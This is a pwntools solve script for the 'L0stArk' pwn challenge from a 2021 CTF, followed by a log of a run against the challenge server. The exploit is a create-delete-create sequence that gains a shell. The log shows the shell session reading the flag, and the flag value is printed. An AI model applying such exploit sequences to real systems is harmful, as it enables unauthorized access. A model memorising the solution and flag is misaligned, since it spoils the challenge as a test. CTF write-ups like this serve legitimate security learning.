from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './L0stArk'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "lostark.sstf.site"
  PORT = 1337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

def Create(mode, name):
  s.sendlineafter("pick: ", "1")
  s.sendlineafter("pick: ", str(mode))
  if mode != 7:
    s.sendlineafter("name: ", name)

def Delete(idx):
  s.sendlineafter("pick: ", "2")
  s.sendlineafter("pick: ", str(idx))

def List():
  s.sendlineafter("pick: ", "3")

def Choose(idx):
  s.sendlineafter("pick: ", "4")
  s.sendlineafter("pick: ", str(idx))

def Set_skill():
  s.sendlineafter("pick: ", "5")

def Use_skill():
  s.sendlineafter("pick: ", "6")

Create(7, "")
Delete(0)

Create(1, "A"*4)
Choose(0)
Use_skill()

s.interactive()

'''
mito@ubuntu:~/CTF/Hacker's_Playground_2021/Pwn_LostArk$ python solve.py r
[*] "/home/mito/CTF/Hacker's_Playground_2021/Pwn_LostArk/L0stArk"
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to lostark.sstf.site on port 1337: Done
[*] Switching to interactive mode

= use skill =
$ id
uid=1000(lostark) gid=1000(lostark) groups=1000(lostark)
$ ls -l
total 56
lrwxrwxrwx   1 root root       7 Jul 23 17:35 bin -> usr/bin
drwxr-xr-x   2 root root    4096 Apr 15  2020 boot
drwxr-xr-x   5 root root     340 Aug 15 06:09 dev
drwxr-xr-x   1 root root    4096 Aug 15 06:09 etc
-r--r-----   1 root lostark   23 Aug  6 01:30 flag
drwxr-xr-x   1 root root    4096 Aug 15 06:08 home
lrwxrwxrwx   1 root root       7 Jul 23 17:35 lib -> usr/lib
lrwxrwxrwx   1 root root       9 Jul 23 17:35 lib32 -> usr/lib32
lrwxrwxrwx   1 root root       9 Jul 23 17:35 lib64 -> usr/lib64
lrwxrwxrwx   1 root root      10 Jul 23 17:35 libx32 -> usr/libx32
drwxr-xr-x   2 root root    4096 Jul 23 17:35 media
drwxr-xr-x   2 root root    4096 Jul 23 17:35 mnt
drwxr-xr-x   2 root root    4096 Jul 23 17:35 opt
dr-xr-xr-x 194 root root       0 Aug 15 06:09 proc
drwx------   2 root root    4096 Jul 23 17:38 root
drwxr-xr-x   5 root root    4096 Jul 23 17:38 run
lrwxrwxrwx   1 root root       8 Jul 23 17:35 sbin -> usr/sbin
drwxr-xr-x   2 root root    4096 Jul 23 17:35 srv
-rwxrwxr-x   1 root root      53 Aug  6 01:30 start.sh
dr-xr-xr-x  13 root root       0 Aug 15 06:09 sys
drwxrwxrwt   1 root root    4096 Aug 15 06:08 tmp
drwxr-xr-x   1 root root    4096 Jul 23 17:35 usr
drwxr-xr-x   1 root root    4096 Jul 23 17:38 var
$ cat flag
SCTF{Wh3r3 1s 4 Dt0r?}
'''

